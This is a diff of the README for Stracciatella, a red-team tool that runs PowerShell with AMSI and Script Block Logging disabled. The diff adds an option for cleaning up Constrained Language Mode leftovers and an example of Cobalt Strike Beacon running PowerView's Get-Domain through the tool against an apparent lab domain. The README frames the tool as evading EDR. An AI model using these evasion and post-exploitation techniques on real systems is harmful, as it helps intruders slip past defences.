@@ -44,16 +44,17 @@ This project inherits from above researches and great security community in orde
 There are couple of options available:
 
 ```
-PS D:\> Stracciatella.exe --help
 
   :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
   Mariusz B. / mgeeky, '19-20 <mb@binary-offensive.com>
   v0.2
 
-Usage: stracciatella.exe [options]
+Usage: stracciatella.exe [options] [command]
   -s <path>, --script <path> - Path to file containing Powershell script to execute. If not options given, will enter
                                a pseudo-shell loop.
   -v, --verbose              - Prints verbose informations
+  -n, --nocleanup            - Don't remove CLM disable leftovers (DLL files in TEMP and COM registry keys).
+                               By default these are going to be always removed.
   -f, --force                - Proceed with execution even if Powershell defenses were not disabled.
                                By default we bail out on failure.
   -c, --command              - Executes the specified commands.
@@ -63,6 +64,7 @@ Usage: stracciatella.exe [options]
   -e, --cmdalsoencoded       - Consider input command (specified in '--command') encoded as well.
                                Decodes input command after decoding and running input script file.
                                By default we only decode input file and consider command given in plaintext
+
 ```
 
 The program accepts command and script file path as it's input. Both are optional, if none were given - pseudo-shell will be started.
@@ -151,11 +153,22 @@ Whereas:
 Stracciatella comes with Aggressor script that when loaded exposes `stracciatella` command in the Beacon console. The usage is pretty much similar to `powerpick`. The input parameter will be xored with a random key. The advantage over `powerpick` is that the Stracciatella does not patch _AMSI.dll_ in the way like Powerpick does (_AmsiScanBuffer_ patch), thus potentially generating less forensic noise as seen by EDRs looking for in-memory patches. Also, Stracciatella will eventually be able to stabily bypass _Constrained Language Mode_ which is currently not possible using `powerpick`.:
 
 ```
-beacon> stracciatella whoami
-[*] Tasked beacon to run .NET program: stracciatella.exe -x 104 -e -c "HwAHCQUB"
-[+] host called home, sent: 135769 bytes
+beacon> powershell-import PowerView.ps1
+[+] host called home, sent: 143784 bytes
+beacon> stracciatella Get-Domain
+[*] Tasked beacon to run .NET program: stracciatella.exe -x 113 -e -c "VQRMWVYZBQUBS15eQENGX0FfQV9AS0RIRUhAXlYNVApZOCM8UVUuWAxYSldZNTgjUTAdGBACS144WylYWVUEWEpRSjYUBVw1HhwQGB8="
+[+] host called home, sent: 264483 bytes
 [+] received output:
-workstation\mariusz
+Forest                  : moneycorp.local
+DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
+Children                : {us.dollarcorp.moneycorp.local}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : moneycorp.local
+PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
+Name                    : dollarcorp.moneycorp.local
 
 ```
 
